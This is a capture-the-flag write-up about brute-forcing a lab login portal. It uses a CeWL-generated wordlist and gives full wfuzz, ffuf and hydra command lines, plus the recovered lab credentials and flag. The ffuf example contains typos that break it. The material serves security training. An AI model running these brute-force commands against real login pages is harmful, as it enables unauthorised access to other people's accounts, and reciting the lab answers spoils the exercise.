# Baby, it's CeWLd outside
#Brute-Forcing

After a thorough investigation, the security team discovered that a notorious individual named McGreedy, known for his dealings in the dark web, had sold the company's credentials. This sale paved the way for a random hacker from the dark web to exploit the portal. The logs point to a brute-force attack. Normally, brute-forcing takes a long time. But in this case, the hacker gained access with only a few tries. It seems that the attacker had a customised wordlist. Perhaps they used a custom wordlist generator like CeWL. Let's try to test it out ourselves!

## CeWL

CeWL (pronounced "cool") is a custom word list generator tool that spiders websites to create word lists based on the site's content. Spidering, in the context of web security and penetration testing, refers to the process of automatically navigating and cataloguing a website's content, often to retrieve the site structure, content, and other relevant details. This capability makes CeWL especially valuable to penetration testers aiming to brute-force login pages or uncover hidden directories using organisation-specific terminology.

CeWL is a wordlist generator that is unique compared to other tools available. While many tools rely on pre-defined lists or common dictionary attacks, CeWL creates custom wordlists based on web page content. Here's why CeWL stands out:

1. `Target-specific wordlists:` CeWL crafts wordlists specifically from the content of a targeted website. This means that the generated list is inherently tailored to the vocabulary and terminology used on that site. Such custom lists can increase the efficiency of brute-forcing tasks.
2. `Depth of search:` CeWL can spider a website to a specified depth, thereby extracting words from not just one page but also from linked pages up to the set depth.
3. `Customisable outputs:` CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This level of customisation can be advantageous for targeting specific types of credentials or vulnerabilities.
4. `Built-in features:`While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
5. `Efficiency:` Given its customisability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
6. `Integration with other tools:` Being command-line based, CeWL can be integrated seamlessly into automated workflows, and its outputs can be directly fed into other cyber security tools.
7. `Actively maintained:` CeWL is actively maintained and updated. This means it stays relevant and compatible with contemporary security needs and challenges.

Customising Commands
- -d: spidering depth 
- -m and -x: minimum and maximum word length
- -a: handling Authentication
- --extension: handling custom extensions
- --offsite: follow external links

## Brute-force the login portal using **_wfuzz_**
```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.132.80/login.php
-d "username=FUZZ&password=FUZ2Z"
```

In the command above:<br>
-z file,usernames.txt loads the usernames list.<br>
-z file,passwords.txt uses the password list generated by CeWL.<br>
--hs "Please enter the correct credentials" hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.<br>
-u specifies the target URL.<br>
-d "username=FUZZ&password=FUZ2Z" provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.<br>

```
UserID: isaias
Password: Happiness
Flag: THM{m3rrY4nt4rct1crAft$}
```

## Other Methods:

### fuff
```
ffuf -s -w usernames.txt:USER -w passwords.txt:PASS -u http://10.10.106.165/loqin.php -d "username=USER&password-PASS" 
-H "Content-Type: application/x-www-form-urlencoded" -fr "Please enter the correct credentials"
```

### hydra
```
hydra -L usernames.txt -P passwords.txt http-post-form://10.10.106.165/login.php:"username=^USER^&password=^PASS^"
:"Please enter the correct credentials"
```

### Turbo Intruder

### Conclusion
AntarctiCrafts' unexpected breach highlighted the power of specialised brute-force attacks. The swift and successful unauthorised access suggests the attacker likely employed a unique, context-specific wordlist, possibly curated using tools like CeWL. This tool can scan a company's public content to create a wordlist enriched with unique jargon and terminologies.
